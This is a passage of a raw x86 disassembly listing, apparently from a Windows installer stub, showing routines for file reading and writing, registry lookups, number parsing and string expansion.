  405e1e:	85 c0                	test   %eax,%eax
  405e20:	75 0d                	jne    0x405e2f
  405e22:	85 ff                	test   %edi,%edi
  405e24:	75 c6                	jne    0x405dec
  405e26:	66 21 3e             	and    %di,(%esi)
  405e29:	5f                   	pop    %edi
  405e2a:	5e                   	pop    %esi
  405e2b:	c9                   	leave
  405e2c:	c2 08 00             	ret    $0x8
  405e2f:	8b c6                	mov    %esi,%eax
  405e31:	eb f6                	jmp    0x405e29
  405e33:	55                   	push   %ebp
  405e34:	8b ec                	mov    %esp,%ebp
  405e36:	56                   	push   %esi
  405e37:	8b 75 10             	mov    0x10(%ebp),%esi
  405e3a:	8d 45 10             	lea    0x10(%ebp),%eax
  405e3d:	6a 00                	push   $0x0
  405e3f:	50                   	push   %eax
  405e40:	56                   	push   %esi
  405e41:	ff 75 0c             	push   0xc(%ebp)
  405e44:	ff 75 08             	push   0x8(%ebp)
  405e47:	ff 15 48 81 40 00    	call   *0x408148
  405e4d:	85 c0                	test   %eax,%eax
  405e4f:	74 0a                	je     0x405e5b
  405e51:	3b 75 10             	cmp    0x10(%ebp),%esi
  405e54:	75 05                	jne    0x405e5b
  405e56:	33 c0                	xor    %eax,%eax
  405e58:	40                   	inc    %eax
  405e59:	eb 02                	jmp    0x405e5d
  405e5b:	33 c0                	xor    %eax,%eax
  405e5d:	5e                   	pop    %esi
  405e5e:	5d                   	pop    %ebp
  405e5f:	c2 0c 00             	ret    $0xc
  405e62:	55                   	push   %ebp
  405e63:	8b ec                	mov    %esp,%ebp
  405e65:	56                   	push   %esi
  405e66:	8b 75 10             	mov    0x10(%ebp),%esi
  405e69:	8d 45 10             	lea    0x10(%ebp),%eax
  405e6c:	6a 00                	push   $0x0
  405e6e:	50                   	push   %eax
  405e6f:	56                   	push   %esi
  405e70:	ff 75 0c             	push   0xc(%ebp)
  405e73:	ff 75 08             	push   0x8(%ebp)
  405e76:	ff 15 e0 80 40 00    	call   *0x4080e0
  405e7c:	85 c0                	test   %eax,%eax
  405e7e:	74 0a                	je     0x405e8a
  405e80:	3b 75 10             	cmp    0x10(%ebp),%esi
  405e83:	75 05                	jne    0x405e8a
  405e85:	33 c0                	xor    %eax,%eax
  405e87:	40                   	inc    %eax
  405e88:	eb 02                	jmp    0x405e8c
  405e8a:	33 c0                	xor    %eax,%eax
  405e8c:	5e                   	pop    %esi
  405e8d:	5d                   	pop    %ebp
  405e8e:	c2 0c 00             	ret    $0xc
  405e91:	55                   	push   %ebp
  405e92:	8b ec                	mov    %esp,%ebp
  405e94:	53                   	push   %ebx
  405e95:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405e98:	56                   	push   %esi
  405e99:	8b 35 44 81 40 00    	mov    0x408144,%esi
  405e9f:	57                   	push   %edi
  405ea0:	33 ff                	xor    %edi,%edi
  405ea2:	6a 01                	push   $0x1
  405ea4:	57                   	push   %edi
  405ea5:	57                   	push   %edi
  405ea6:	53                   	push   %ebx
  405ea7:	ff d6                	call   *%esi
  405ea9:	85 c0                	test   %eax,%eax
  405eab:	75 4f                	jne    0x405efc
  405ead:	8d 45 0a             	lea    0xa(%ebp),%eax
  405eb0:	6a 02                	push   $0x2
  405eb2:	50                   	push   %eax
  405eb3:	53                   	push   %ebx
  405eb4:	e8 7a ff ff ff       	call   0x405e33
  405eb9:	85 c0                	test   %eax,%eax
  405ebb:	74 0c                	je     0x405ec9
  405ebd:	66 81 7d 0a ff fe    	cmpw   $0xfeff,0xa(%ebp)
  405ec3:	75 04                	jne    0x405ec9
  405ec5:	33 c0                	xor    %eax,%eax
  405ec7:	eb 36                	jmp    0x405eff
  405ec9:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  405ecc:	74 28                	je     0x405ef6
  405ece:	6a 01                	push   $0x1
  405ed0:	57                   	push   %edi
  405ed1:	57                   	push   %edi
  405ed2:	53                   	push   %ebx
  405ed3:	ff d6                	call   *%esi
  405ed5:	85 c0                	test   %eax,%eax
  405ed7:	75 1d                	jne    0x405ef6
  405ed9:	6a 02                	push   $0x2
  405edb:	68 1c 84 40 00       	push   $0x40841c
  405ee0:	53                   	push   %ebx
  405ee1:	e8 7c ff ff ff       	call   0x405e62
  405ee6:	f7 d8                	neg    %eax
  405ee8:	1b c0                	sbb    %eax,%eax
  405eea:	25 fb bf ff 7f       	and    $0x7fffbffb,%eax
  405eef:	05 05 40 00 80       	add    $0x80004005,%eax
  405ef4:	eb 09                	jmp    0x405eff
  405ef6:	57                   	push   %edi
  405ef7:	57                   	push   %edi
  405ef8:	57                   	push   %edi
  405ef9:	53                   	push   %ebx
  405efa:	ff d6                	call   *%esi
  405efc:	33 c0                	xor    %eax,%eax
  405efe:	40                   	inc    %eax
  405eff:	5f                   	pop    %edi
  405f00:	5e                   	pop    %esi
  405f01:	5b                   	pop    %ebx
  405f02:	5d                   	pop    %ebp
  405f03:	c2 08 00             	ret    $0x8
  405f06:	53                   	push   %ebx
  405f07:	8b 1d bc 80 40 00    	mov    0x4080bc,%ebx
  405f0d:	55                   	push   %ebp
  405f0e:	56                   	push   %esi
  405f0f:	8b 74 24 14          	mov    0x14(%esp),%esi
  405f13:	57                   	push   %edi
  405f14:	85 f6                	test   %esi,%esi
  405f16:	c7 05 e8 88 46 00 4e 	movl   $0x55004e,0x4688e8
  405f1d:	00 55 00 
  405f20:	c7 05 ec 88 46 00 4c 	movl   $0x4c,0x4688ec
  405f27:	00 00 00 
  405f2a:	bf 00 04 00 00       	mov    $0x400,%edi
  405f2f:	bd e8 88 46 00       	mov    $0x4688e8,%ebp
  405f34:	74 26                	je     0x405f5c
  405f36:	6a 01                	push   $0x1
  405f38:	6a 00                	push   $0x0
  405f3a:	56                   	push   %esi
  405f3b:	e8 70 fe ff ff       	call   0x405db0
  405f40:	50                   	push   %eax
  405f41:	ff 15 20 81 40 00    	call   *0x408120
  405f47:	57                   	push   %edi
  405f48:	55                   	push   %ebp
  405f49:	56                   	push   %esi
  405f4a:	ff d3                	call   *%ebx
  405f4c:	85 c0                	test   %eax,%eax
  405f4e:	0f 84 27 01 00 00    	je     0x40607b
  405f54:	3b c7                	cmp    %edi,%eax
  405f56:	0f 8f 1f 01 00 00    	jg     0x40607b
  405f5c:	be e8 90 46 00       	mov    $0x4690e8,%esi
  405f61:	57                   	push   %edi
  405f62:	56                   	push   %esi
  405f63:	ff 74 24 1c          	push   0x1c(%esp)
  405f67:	ff d3                	call   *%ebx
  405f69:	85 c0                	test   %eax,%eax
  405f6b:	0f 84 0a 01 00 00    	je     0x40607b
  405f71:	3b c7                	cmp    %edi,%eax
  405f73:	0f 8f 02 01 00 00    	jg     0x40607b
  405f79:	56                   	push   %esi
  405f7a:	55                   	push   %ebp
  405f7b:	68 70 a5 40 00       	push   $0x40a570
  405f80:	68 e8 84 46 00       	push   $0x4684e8
  405f85:	ff 15 00 82 40 00    	call   *0x408200
  405f8b:	8b d8                	mov    %eax,%ebx
  405f8d:	a1 f4 ae 47 00       	mov    0x47aef4,%eax
  405f92:	83 c4 10             	add    $0x10,%esp
  405f95:	ff b0 28 01 00 00    	push   0x128(%eax)
  405f9b:	56                   	push   %esi
  405f9c:	e8 3b 03 00 00       	call   0x4062dc
  405fa1:	6a 04                	push   $0x4
  405fa3:	68 00 00 00 c0       	push   $0xc0000000
  405fa8:	56                   	push   %esi
  405fa9:	e8 02 fe ff ff       	call   0x405db0
  405fae:	8b e8                	mov    %eax,%ebp
  405fb0:	83 fd ff             	cmp    $0xffffffff,%ebp
  405fb3:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  405fb7:	0f 84 be 00 00 00    	je     0x40607b
  405fbd:	6a 00                	push   $0x0
  405fbf:	55                   	push   %ebp
  405fc0:	ff 15 80 80 40 00    	call   *0x408080
  405fc6:	8b f8                	mov    %eax,%edi
  405fc8:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  405fcc:	50                   	push   %eax
  405fcd:	6a 40                	push   $0x40
  405fcf:	ff 15 34 81 40 00    	call   *0x408134
  405fd5:	8b f0                	mov    %eax,%esi
  405fd7:	85 f6                	test   %esi,%esi
  405fd9:	0f 84 95 00 00 00    	je     0x406074
  405fdf:	57                   	push   %edi
  405fe0:	56                   	push   %esi
  405fe1:	55                   	push   %ebp
  405fe2:	e8 4c fe ff ff       	call   0x405e33
  405fe7:	85 c0                	test   %eax,%eax
  405fe9:	0f 84 85 00 00 00    	je     0x406074
  405fef:	68 64 a5 40 00       	push   $0x40a564
  405ff4:	56                   	push   %esi
  405ff5:	e8 1b fd ff ff       	call   0x405d15
  405ffa:	85 c0                	test   %eax,%eax
  405ffc:	75 14                	jne    0x406012
  405ffe:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  406001:	68 64 a5 40 00       	push   $0x40a564
  406006:	50                   	push   %eax
  406007:	ff 15 e4 80 40 00    	call   *0x4080e4
  40600d:	83 c7 0a             	add    $0xa,%edi
  406010:	eb 35                	jmp    0x406047
  406012:	83 c0 0a             	add    $0xa,%eax
  406015:	68 60 a5 40 00       	push   $0x40a560
  40601a:	50                   	push   %eax
  40601b:	e8 f5 fc ff ff       	call   0x405d15
  406020:	8b e8                	mov    %eax,%ebp
  406022:	85 ed                	test   %ebp,%ebp
  406024:	74 1d                	je     0x406043
  406026:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  406029:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  40602c:	eb 06                	jmp    0x406034
  40602e:	8a 11                	mov    (%ecx),%dl
  406030:	88 10                	mov    %dl,(%eax)
  406032:	48                   	dec    %eax
  406033:	49                   	dec    %ecx
  406034:	3b cd                	cmp    %ebp,%ecx
  406036:	77 f6                	ja     0x40602e
  406038:	2b ee                	sub    %esi,%ebp
  40603a:	45                   	inc    %ebp
  40603b:	8b c5                	mov    %ebp,%eax
  40603d:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  406041:	eb 06                	jmp    0x406049
  406043:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  406047:	8b c7                	mov    %edi,%eax
  406049:	53                   	push   %ebx
  40604a:	03 c6                	add    %esi,%eax
  40604c:	68 e8 84 46 00       	push   $0x4684e8
  406051:	50                   	push   %eax
  406052:	e8 14 fd ff ff       	call   0x405d6b
  406057:	33 c0                	xor    %eax,%eax
  406059:	50                   	push   %eax
  40605a:	50                   	push   %eax
  40605b:	50                   	push   %eax
  40605c:	55                   	push   %ebp
  40605d:	ff 15 44 81 40 00    	call   *0x408144
  406063:	03 fb                	add    %ebx,%edi
  406065:	57                   	push   %edi
  406066:	56                   	push   %esi
  406067:	55                   	push   %ebp
  406068:	e8 f5 fd ff ff       	call   0x405e62
  40606d:	56                   	push   %esi
  40606e:	ff 15 28 81 40 00    	call   *0x408128
  406074:	55                   	push   %ebp
  406075:	ff 15 20 81 40 00    	call   *0x408120
  40607b:	5f                   	pop    %edi
  40607c:	5e                   	pop    %esi
  40607d:	5d                   	pop    %ebp
  40607e:	5b                   	pop    %ebx
  40607f:	c3                   	ret
  406080:	6a 05                	push   $0x5
  406082:	ff 74 24 0c          	push   0xc(%esp)
  406086:	ff 74 24 0c          	push   0xc(%esp)
  40608a:	ff 15 e8 80 40 00    	call   *0x4080e8
  406090:	85 c0                	test   %eax,%eax
  406092:	75 0f                	jne    0x4060a3
  406094:	ff 74 24 08          	push   0x8(%esp)
  406098:	ff 74 24 08          	push   0x8(%esp)
  40609c:	e8 65 fe ff ff       	call   0x405f06
  4060a1:	59                   	pop    %ecx
  4060a2:	59                   	pop    %ecx
  4060a3:	ff 05 90 af 47 00    	incl   0x47af90
  4060a9:	c2 08 00             	ret    $0x8
  4060ac:	8b 15 ec ae 47 00    	mov    0x47aeec,%edx
  4060b2:	53                   	push   %ebx
  4060b3:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  4060b7:	57                   	push   %edi
  4060b8:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4060bc:	f7 d2                	not    %edx
  4060be:	8b 07                	mov    (%edi),%eax
  4060c0:	c1 ea 16             	shr    $0x16,%edx
  4060c3:	81 e2 00 01 00 00    	and    $0x100,%edx
  4060c9:	a8 20                	test   $0x20,%al
  4060cb:	74 34                	je     0x406101
  4060cd:	f7 c3 00 00 00 60    	test   $0x60000000,%ebx
  4060d3:	74 2c                	je     0x406101
  4060d5:	8b cb                	mov    %ebx,%ecx
  4060d7:	56                   	push   %esi
  4060d8:	c1 e9 15             	shr    $0x15,%ecx
  4060db:	be 00 03 00 00       	mov    $0x300,%esi
  4060e0:	23 ce                	and    %esi,%ecx
  4060e2:	3b ce                	cmp    %esi,%ecx
  4060e4:	5e                   	pop    %esi
  4060e5:	75 0a                	jne    0x4060f1
  4060e7:	8b ca                	mov    %edx,%ecx
  4060e9:	f7 d1                	not    %ecx
  4060eb:	23 0d b0 af 47 00    	and    0x47afb0,%ecx
  4060f1:	80 e4 fe             	and    $0xfe,%ah
  4060f4:	0b c1                	or     %ecx,%eax
  4060f6:	80 e4 fd             	and    $0xfd,%ah
  4060f9:	81 e3 ff ff ff 9f    	and    $0x9fffffff,%ebx
  4060ff:	eb 0d                	jmp    0x40610e
  406101:	a9 00 00 10 00       	test   $0x100000,%eax
  406106:	74 06                	je     0x40610e
  406108:	0b 05 b0 af 47 00    	or     0x47afb0,%eax
  40610e:	8b c8                	mov    %eax,%ecx
  406110:	23 c2                	and    %edx,%eax
  406112:	81 e1 df ff ef ff    	and    $0xffefffdf,%ecx
  406118:	f7 d8                	neg    %eax
  40611a:	1b c0                	sbb    %eax,%eax
  40611c:	89 0f                	mov    %ecx,(%edi)
  40611e:	f7 d0                	not    %eax
  406120:	23 c3                	and    %ebx,%eax
  406122:	5f                   	pop    %edi
  406123:	5b                   	pop    %ebx
  406124:	c2 08 00             	ret    $0x8
  406127:	55                   	push   %ebp
  406128:	8b ec                	mov    %esp,%ebp
  40612a:	8d 45 10             	lea    0x10(%ebp),%eax
  40612d:	50                   	push   %eax
  40612e:	ff 75 08             	push   0x8(%ebp)
  406131:	e8 76 ff ff ff       	call   0x4060ac
  406136:	85 c0                	test   %eax,%eax
  406138:	75 05                	jne    0x40613f
  40613a:	6a 06                	push   $0x6
  40613c:	58                   	pop    %eax
  40613d:	eb 12                	jmp    0x406151
  40613f:	ff 75 14             	push   0x14(%ebp)
  406142:	ff 75 10             	push   0x10(%ebp)
  406145:	6a 00                	push   $0x0
  406147:	ff 75 0c             	push   0xc(%ebp)
  40614a:	50                   	push   %eax
  40614b:	ff 15 08 80 40 00    	call   *0x408008
  406151:	5d                   	pop    %ebp
  406152:	c2 10 00             	ret    $0x10
  406155:	55                   	push   %ebp
  406156:	8b ec                	mov    %esp,%ebp
  406158:	8d 45 10             	lea    0x10(%ebp),%eax
  40615b:	50                   	push   %eax
  40615c:	ff 75 08             	push   0x8(%ebp)
  40615f:	e8 48 ff ff ff       	call   0x4060ac
  406164:	33 c9                	xor    %ecx,%ecx
  406166:	3b c1                	cmp    %ecx,%eax
  406168:	75 05                	jne    0x40616f
  40616a:	6a 06                	push   $0x6
  40616c:	58                   	pop    %eax
  40616d:	eb 15                	jmp    0x406184
  40616f:	51                   	push   %ecx
  406170:	ff 75 14             	push   0x14(%ebp)
  406173:	51                   	push   %ecx
  406174:	ff 75 10             	push   0x10(%ebp)
  406177:	51                   	push   %ecx
  406178:	51                   	push   %ecx
  406179:	51                   	push   %ecx
  40617a:	ff 75 0c             	push   0xc(%ebp)
  40617d:	50                   	push   %eax
  40617e:	ff 15 04 80 40 00    	call   *0x408004
  406184:	5d                   	pop    %ebp
  406185:	c2 10 00             	ret    $0x10
  406188:	55                   	push   %ebp
  406189:	8b ec                	mov    %esp,%ebp
  40618b:	51                   	push   %ecx
  40618c:	8d 45 18             	lea    0x18(%ebp),%eax
  40618f:	56                   	push   %esi
  406190:	50                   	push   %eax
  406191:	8b 45 18             	mov    0x18(%ebp),%eax
  406194:	f7 d8                	neg    %eax
  406196:	1b c0                	sbb    %eax,%eax
  406198:	c7 45 fc 00 40 00 00 	movl   $0x4000,-0x4(%ebp)
  40619f:	25 00 01 00 00       	and    $0x100,%eax
  4061a4:	0d 19 00 02 00       	or     $0x20019,%eax
  4061a9:	50                   	push   %eax
  4061aa:	ff 75 0c             	push   0xc(%ebp)
  4061ad:	ff 75 08             	push   0x8(%ebp)
  4061b0:	e8 72 ff ff ff       	call   0x406127
  4061b5:	8b 75 14             	mov    0x14(%ebp),%esi
  4061b8:	85 c0                	test   %eax,%eax
  4061ba:	75 3c                	jne    0x4061f8
  4061bc:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4061bf:	57                   	push   %edi
  4061c0:	50                   	push   %eax
  4061c1:	8d 45 0c             	lea    0xc(%ebp),%eax
  4061c4:	56                   	push   %esi
  4061c5:	50                   	push   %eax
  4061c6:	6a 00                	push   $0x0
  4061c8:	ff 75 10             	push   0x10(%ebp)
  4061cb:	ff 75 18             	push   0x18(%ebp)
  4061ce:	ff 15 2c 80 40 00    	call   *0x40802c
  4061d4:	ff 75 18             	push   0x18(%ebp)
  4061d7:	8b f8                	mov    %eax,%edi
  4061d9:	ff 15 24 80 40 00    	call   *0x408024
  4061df:	66 83 a6 fe 3f 00 00 	andw   $0x0,0x3ffe(%esi)
  4061e6:	00 
  4061e7:	85 ff                	test   %edi,%edi
  4061e9:	5f                   	pop    %edi
  4061ea:	75 0c                	jne    0x4061f8
  4061ec:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  4061f0:	74 0a                	je     0x4061fc
  4061f2:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  4061f6:	74 04                	je     0x4061fc
  4061f8:	66 83 26 00          	andw   $0x0,(%esi)
  4061fc:	5e                   	pop    %esi
  4061fd:	c9                   	leave
  4061fe:	c2 14 00             	ret    $0x14
  406201:	ff 74 24 08          	push   0x8(%esp)
  406205:	68 20 84 40 00       	push   $0x408420
  40620a:	ff 74 24 0c          	push   0xc(%esp)
  40620e:	ff 15 90 82 40 00    	call   *0x408290
  406214:	83 c4 0c             	add    $0xc,%esp
  406217:	c2 08 00             	ret    $0x8
  40621a:	55                   	push   %ebp
  40621b:	8b ec                	mov    %esp,%ebp
  40621d:	51                   	push   %ecx
  40621e:	51                   	push   %ecx
  40621f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406222:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406226:	53                   	push   %ebx
  406227:	56                   	push   %esi
  406228:	66 83 39 2d          	cmpw   $0x2d,(%ecx)
  40622c:	6a 0a                	push   $0xa
  40622e:	58                   	pop    %eax
  40622f:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  406236:	6a 39                	push   $0x39
  406238:	5b                   	pop    %ebx
  406239:	75 06                	jne    0x406241
  40623b:	41                   	inc    %ecx
  40623c:	41                   	inc    %ecx
  40623d:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  406241:	66 83 39 30          	cmpw   $0x30,(%ecx)
  406245:	75 27                	jne    0x40626e
  406247:	41                   	inc    %ecx
  406248:	41                   	inc    %ecx
  406249:	66 8b 11             	mov    (%ecx),%dx
  40624c:	66 83 fa 30          	cmp    $0x30,%dx
  406250:	72 0c                	jb     0x40625e
  406252:	66 83 fa 37          	cmp    $0x37,%dx
  406256:	77 06                	ja     0x40625e
  406258:	6a 08                	push   $0x8
  40625a:	58                   	pop    %eax
  40625b:	6a 37                	push   $0x37
  40625d:	5b                   	pop    %ebx
  40625e:	0f b7 d2             	movzwl %dx,%edx
  406261:	83 e2 df             	and    $0xffffffdf,%edx
  406264:	83 fa 58             	cmp    $0x58,%edx
  406267:	75 05                	jne    0x40626e
  406269:	6a 10                	push   $0x10
  40626b:	41                   	inc    %ecx
  40626c:	58                   	pop    %eax
  40626d:	41                   	inc    %ecx
  40626e:	0f b7 11             	movzwl (%ecx),%edx
  406271:	41                   	inc    %ecx
  406272:	41                   	inc    %ecx
  406273:	83 fa 30             	cmp    $0x30,%edx
  406276:	7c 0c                	jl     0x406284
  406278:	0f b7 f3             	movzwl %bx,%esi
  40627b:	3b d6                	cmp    %esi,%edx
  40627d:	7f 05                	jg     0x406284
  40627f:	83 ea 30             	sub    $0x30,%edx
  406282:	eb 1b                	jmp    0x40629f
  406284:	66 3d 10 00          	cmp    $0x10,%ax
  406288:	75 23                	jne    0x4062ad
  40628a:	8b f2                	mov    %edx,%esi
  40628c:	83 e6 df             	and    $0xffffffdf,%esi
  40628f:	83 fe 41             	cmp    $0x41,%esi
  406292:	7c 19                	jl     0x4062ad
  406294:	83 fe 46             	cmp    $0x46,%esi
  406297:	7f 14                	jg     0x4062ad
  406299:	83 e2 07             	and    $0x7,%edx
  40629c:	83 c2 09             	add    $0x9,%edx
  40629f:	0f b7 f0             	movzwl %ax,%esi
  4062a2:	0f af 75 fc          	imul   -0x4(%ebp),%esi
  4062a6:	03 f2                	add    %edx,%esi
  4062a8:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4062ab:	eb c1                	jmp    0x40626e
  4062ad:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4062b0:	5e                   	pop    %esi
  4062b1:	0f af 45 fc          	imul   -0x4(%ebp),%eax
  4062b5:	5b                   	pop    %ebx
  4062b6:	c9                   	leave
  4062b7:	c2 04 00             	ret    $0x4
  4062ba:	68 00 20 00 00       	push   $0x2000
  4062bf:	ff 74 24 0c          	push   0xc(%esp)
  4062c3:	ff 74 24 0c          	push   0xc(%esp)
  4062c7:	ff 15 b0 80 40 00    	call   *0x4080b0
  4062cd:	c2 08 00             	ret    $0x8
  4062d0:	ff 25 ac 80 40 00    	jmp    *0x4080ac
  4062d6:	ff 25 ec 80 40 00    	jmp    *0x4080ec
  4062dc:	55                   	push   %ebp
  4062dd:	8b ec                	mov    %esp,%ebp
  4062df:	83 ec 18             	sub    $0x18,%esp
  4062e2:	8b 45 0c             	mov    0xc(%ebp),%eax
  4062e5:	85 c0                	test   %eax,%eax
  4062e7:	7d 11                	jge    0x4062fa
  4062e9:	8b 0d bc 2e 47 00    	mov    0x472ebc,%ecx
  4062ef:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  4062f6:	2b c8                	sub    %eax,%ecx
  4062f8:	8b 01                	mov    (%ecx),%eax
  4062fa:	8b 0d 38 af 47 00    	mov    0x47af38,%ecx
  406300:	53                   	push   %ebx
  406301:	56                   	push   %esi
  406302:	57                   	push   %edi
  406303:	8d 14 41             	lea    (%ecx,%eax,2),%edx
  406306:	b8 80 ae 46 00       	mov    $0x46ae80,%eax
  40630b:	39 45 08             	cmp    %eax,0x8(%ebp)
  40630e:	8b f0                	mov    %eax,%esi
  406310:	0f 82 12 02 00 00    	jb     0x406528
  406316:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406319:	2b c8                	sub    %eax,%ecx
  40631b:	d1 f9                	sar    $1,%ecx
  40631d:	81 f9 00 40 00 00    	cmp    $0x4000,%ecx
  406323:	0f 83 ff 01 00 00    	jae    0x406528
  406329:	8b 75 08             	mov    0x8(%ebp),%esi
  40632c:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  406330:	e9 f3 01 00 00       	jmp    0x406528
  406335:	8b ce                	mov    %esi,%ecx
  406337:	2b c8                	sub    %eax,%ecx
  406339:	83 e1 fe             	and    $0xfffffffe,%ecx
  40633c:	81 f9 00 40 00 00    	cmp    $0x4000,%ecx
  406342:	0f 8d ec 01 00 00    	jge    0x406534
  406348:	6a 02                	push   $0x2
  40634a:	59                   	pop    %ecx
  40634b:	03 d1                	add    %ecx,%edx
  40634d:	66 83 ff 04          	cmp    $0x4,%di
  406351:	89 55 0c             	mov    %edx,0xc(%ebp)
  406354:	0f 83 bb 01 00 00    	jae    0x406515
  40635a:	8a 4a 01             	mov    0x1(%edx),%cl
  40635d:	8a 02                	mov    (%edx),%al
  40635f:	8a d1                	mov    %cl,%dl
  406361:	8a d8                	mov    %al,%bl
  406363:	83 e2 7f             	and    $0x7f,%edx
  406366:	83 e3 7f             	and    $0x7f,%ebx
  406369:	c1 e2 07             	shl    $0x7,%edx
  40636c:	0f b6 c0             	movzbl %al,%eax
  40636f:	0b d3                	or     %ebx,%edx
  406371:	8b d8                	mov    %eax,%ebx
  406373:	89 55 fc             	mov    %edx,-0x4(%ebp)
  406376:	ba 00 80 00 00       	mov    $0x8000,%edx
  40637b:	0b da                	or     %edx,%ebx
  40637d:	83 45 0c 02          	addl   $0x2,0xc(%ebp)
  406381:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  406384:	89 45 ec             	mov    %eax,-0x14(%ebp)
  406387:	0f b6 d9             	movzbl %cl,%ebx
  40638a:	8b cb                	mov    %ebx,%ecx
  40638c:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  40638f:	0b ca                	or     %edx,%ecx
  406391:	66 83 ff 02          	cmp    $0x2,%di
  406395:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406398:	0f 85 1a 01 00 00    	jne    0x4064b8
  40639e:	8b 0d ec ae 47 00    	mov    0x47aeec,%ecx
  4063a4:	6a 02                	push   $0x2
  4063a6:	85 c9                	test   %ecx,%ecx
  4063a8:	5f                   	pop    %edi
  4063a9:	79 17                	jns    0x4063c2
  4063ab:	66 81 f9 04 5a       	cmp    $0x5a04,%cx
  4063b0:	74 10                	je     0x4063c2
  4063b2:	83 fb 23             	cmp    $0x23,%ebx
  4063b5:	74 0b                	je     0x4063c2
  4063b7:	83 fb 2e             	cmp    $0x2e,%ebx
  4063ba:	74 06                	je     0x4063c2
  4063bc:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4063c0:	eb 07                	jmp    0x4063c9
  4063c2:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4063c9:	83 3d 84 af 47 00 00 	cmpl   $0x0,0x47af84
  4063d0:	74 03                	je     0x4063d5
  4063d2:	6a 04                	push   $0x4
  4063d4:	5f                   	pop    %edi
  4063d5:	84 c0                	test   %al,%al
  4063d7:	79 39                	jns    0x406412
  4063d9:	8b c8                	mov    %eax,%ecx
  4063db:	83 e0 3f             	and    $0x3f,%eax
  4063de:	83 e1 40             	and    $0x40,%ecx
  4063e1:	51                   	push   %ecx
  4063e2:	8b 0d 38 af 47 00    	mov    0x47af38,%ecx
  4063e8:	56                   	push   %esi
  4063e9:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  4063ec:	50                   	push   %eax
  4063ed:	68 28 84 40 00       	push   $0x408428
  4063f2:	68 02 00 00 80       	push   $0x80000002
  4063f7:	e8 8c fd ff ff       	call   0x406188
  4063fc:	66 83 3e 00          	cmpw   $0x0,(%esi)
  406400:	0f 85 9a 00 00 00    	jne    0x4064a0
  406406:	53                   	push   %ebx
  406407:	56                   	push   %esi
  406408:	e8 cf fe ff ff       	call   0x4062dc
  40640d:	e9 85 00 00 00       	jmp    0x406497
  406412:	83 f8 25             	cmp    $0x25,%eax
  406415:	75 0e                	jne    0x406425
  406417:	68 00 20 00 00       	push   $0x2000
  40641c:	56                   	push   %esi
  40641d:	ff 15 f0 80 40 00    	call   *0x4080f0
  406423:	eb 72                	jmp    0x406497
  406425:	83 f8 24             	cmp    $0x24,%eax
  406428:	75 69                	jne    0x406493
  40642a:	68 00 20 00 00       	push   $0x2000
  40642f:	56                   	push   %esi
  406430:	ff 15 98 80 40 00    	call   *0x408098
  406436:	33 ff                	xor    %edi,%edi
  406438:	eb 59                	jmp    0x406493
  40643a:	a1 e4 ae 47 00       	mov    0x47aee4,%eax
  40643f:	33 c9                	xor    %ecx,%ecx
  406441:	4f                   	dec    %edi
  406442:	3b c1                	cmp    %ecx,%eax
  406444:	74 18                	je     0x40645e
  406446:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  406449:	74 13                	je     0x40645e
  40644b:	56                   	push   %esi
  40644c:	51                   	push   %ecx
  40644d:	51                   	push   %ecx
  40644e:	ff 74 bd e8          	push   -0x18(%ebp,%edi,4)
  406452:	ff 35 e8 ae 47 00    	push   0x47aee8
  406458:	ff d0                	call   *%eax
  40645a:	85 c0                	test   %eax,%eax
  40645c:	74 39                	je     0x406497
  40645e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406461:	50                   	push   %eax
  406462:	ff 74 bd e8          	push   -0x18(%ebp,%edi,4)
  406466:	ff 35 e8 ae 47 00    	push   0x47aee8
  40646c:	ff 15 78 81 40 00    	call   *0x408178
  406472:	85 c0                	test   %eax,%eax
  406474:	75 19                	jne    0x40648f
  406476:	56                   	push   %esi
  406477:	ff 75 f8             	push   -0x8(%ebp)
  40647a:	ff 15 80 81 40 00    	call   *0x408180
  406480:	ff 75 f8             	push   -0x8(%ebp)
  406483:	8b d8                	mov    %eax,%ebx
  406485:	ff 15 a4 82 40 00    	call   *0x4082a4
  40648b:	85 db                	test   %ebx,%ebx
  40648d:	75 08                	jne    0x406497
  40648f:	66 83 26 00          	andw   $0x0,(%esi)
  406493:	85 ff                	test   %edi,%edi
  406495:	75 a3                	jne    0x40643a
  406497:	66 83 3e 00          	cmpw   $0x0,(%esi)
  40649b:	74 13                	je     0x4064b0
  40649d:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  4064a0:	83 fb 1a             	cmp    $0x1a,%ebx
  4064a3:	75 0b                	jne    0x4064b0
  4064a5:	68 80 84 40 00       	push   $0x408480
  4064aa:	56                   	push   %esi
  4064ab:	e8 26 fe ff ff       	call   0x4062d6
  4064b0:	56                   	push   %esi
  4064b1:	e8 98 00 00 00       	call   0x40654e
  4064b6:	eb 4a                	jmp    0x406502
  4064b8:	66 83 ff 03          	cmp    $0x3,%di
  4064bc:	75 31                	jne    0x4064ef
  4064be:	8b 7d fc             	mov    -0x4(%ebp),%edi
  4064c1:	83 ff 1d             	cmp    $0x1d,%edi
